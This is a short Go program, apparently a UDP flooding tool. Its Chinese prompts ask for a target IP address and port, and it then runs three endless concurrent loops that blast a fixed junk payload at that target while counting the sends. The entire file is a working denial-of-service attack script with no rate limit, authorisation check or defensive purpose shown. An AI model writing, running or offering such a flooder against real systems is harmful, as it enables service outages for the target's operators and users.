package main

import (
	"fmt"
	"net"
	"time"
)

var num int = 0

func send_data(ip string, port string) {
	a := ip + ":" + port
	conn, err := net.Dial("udp", a)
	if err != nil {
		return
	}
	defer conn.Close()
	b := []byte("你家吗你家吗你家吗你家吗你家吗你家吗你家吗你家吗你家吗你家吗")
	conn.Write(b)
	num++
	fmt.Printf("发送成功! 当前为第 %d 发送请求\n", num)
}

func run(ip string, port string) {
	for {
		send_data(ip, port)
	}
}

func main() {
	var ip, port string
	fmt.Print("请输入IP  : ")
	fmt.Scanln(&ip)
	fmt.Print("请输入PORT: ")
	fmt.Scanln(&port)
	for i := 0; i < 2; i++ {
		go run(ip, port)
		time.Sleep(time.Duration(2))
	}
	run(ip, port)
}